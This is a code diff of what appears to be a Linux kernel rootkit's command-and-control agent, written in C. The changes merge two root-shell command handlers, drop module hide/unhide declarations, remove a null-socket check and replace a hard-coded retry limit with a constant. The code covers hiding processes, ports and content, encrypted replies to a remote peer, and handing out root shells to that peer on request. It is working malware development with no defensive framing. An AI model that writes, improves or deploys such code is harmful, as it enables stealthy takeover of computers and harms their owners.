@@ -21,9 +21,6 @@ extern struct rk_target_list pid_targets;
 extern struct rk_target_list content_targets;
 extern struct rk_target_list port_targets;
 
-extern void rk_module_hide(void);
-extern void rk_module_unhide(void);
-
 static int rk_agent_reply(struct rk_agent *agent, struct socket *socket,
 			  const unsigned char *plaintext, size_t plaintext_length)
 {
@@ -136,31 +133,14 @@ static int rk_agent_command(struct rk_agent *agent, struct socket *socket,
 					 port_targets.count);
 		return rk_agent_reply(agent, socket, reply, reply_length);
 	}
-	case RK_COMMAND_SHELL: {
-		struct rk_root_shell_ticket ticket;
-
-		error = rk_root_shell_request(
-			agent->shell, agent->peer.sin_addr.s_addr,
-			command.shell_port, &ticket);
-		if (!error) {
-			reply_length = scnprintf(
-				reply, sizeof(reply), "OPEN %08x %016llx",
-				ticket.request_id,
-				(unsigned long long)ticket.cookie);
-			return rk_agent_reply(agent, socket, reply,
-					      reply_length);
-		}
-		if (error == -EBUSY)
-			return rk_agent_reply(agent, socket,
-					      (const unsigned char *)"ERR busy", 8);
-		return rk_agent_reply(agent, socket,
-				      (const unsigned char *)"ERR shell", 9);
-	}
+	case RK_COMMAND_SHELL:
 	case RK_COMMAND_EXEC_SHELL: {
+		struct rk_root_shell *slot = command.kind == RK_COMMAND_SHELL
+					    ? agent->shell : agent->exec_shell;
 		struct rk_root_shell_ticket ticket;
 
 		error = rk_root_shell_request(
-			agent->exec_shell, agent->peer.sin_addr.s_addr,
+			slot, agent->peer.sin_addr.s_addr,
 			command.shell_port, &ticket);
 		if (!error) {
 			reply_length = scnprintf(
@@ -352,8 +332,6 @@ static int rk_agent_attempt(struct rk_agent *agent)
 				 &socket);
 	if (error)
 		return error;
-	if (!socket)
-		return -EPROTO;
 
 	mutex_lock(&agent->lock);
 	if (agent->stopping) {
@@ -447,7 +425,7 @@ int rk_agent_start(struct rk_agent *agent, __be32 peer_address, u16 peer_port,
 	struct task_struct *task;
 
 	if (!agent || !peer_address || !peer_port || !retry_base_ms ||
-	    retry_base_ms > retry_max_ms || retry_max_ms > 5000 ||
+	    retry_base_ms > retry_max_ms || retry_max_ms > RK_RETRY_MAX_CAP_MS ||
 	    !key || key_length != RK_AEAD_KEY_LENGTH || !shell ||
 	    !exec_shell)
 		return -EINVAL;
